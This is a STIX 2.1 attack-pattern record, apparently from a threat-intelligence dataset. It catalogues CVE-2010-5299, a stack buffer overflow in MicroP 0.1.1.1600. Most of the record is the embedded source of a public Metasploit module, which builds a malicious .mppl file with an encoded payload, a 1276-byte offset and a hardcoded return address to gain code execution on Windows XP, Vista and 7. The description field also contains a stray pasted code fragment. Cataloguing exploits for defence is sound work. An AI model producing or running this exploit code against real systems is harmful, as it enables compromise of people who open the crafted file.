{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5432e44-17ec-4d27-8558-59bbcf6fb3bb",
    "created": "2024-08-14T16:36:39.999703Z",
    "modified": "2024-08-14T16:36:39.999707Z",
    "name": "MicroP 0.1.1.1600 (MPPL File) Stack Buffer Overflow",
    "description": " This module exploits a vulnerability found in MicroP 0.1.1.1600.  A stack-based buffer overflow occurs when the content of a .mppl file gets copied onto the stack which overwrites the lpFileName parameter of a CreateFileA() function, and results arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/microp_mppl.rb",
            "external_id": "microp_mppl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-5299"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MicroP 0.1.1.1600 (MPPL File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in MicroP 0.1.1.1600.  A stack-based\n        buffer overflow occurs when the content of a .mppl file gets copied onto the stack,\n        which overwrites the lpFileName parameter of a CreateFileA() function, and results\n        arbitrary code execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'James Fitts <fitts.james[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-5299' ],\n          [ 'OSVDB', '73627'],\n          [ 'EDB', '14720' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 728,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3 / Vista / 7',\n            {\n              'Ret'    => 0x100145b5,  #jmp eax in bass.dll\n              'Offset' => 1276,        #Offset to overwrite EIP\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-08-23',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.mppl']),\n        ])\n  end\n\n  def exploit\n    mppl  = payload.encoded\n    mppl << rand_text_alpha(target['Offset'] - payload.encoded.length)\n    mppl << [target.ret].pack('V')\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(mppl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-23",
    "x_mitre_platforms": [
        "win'"
    ]
}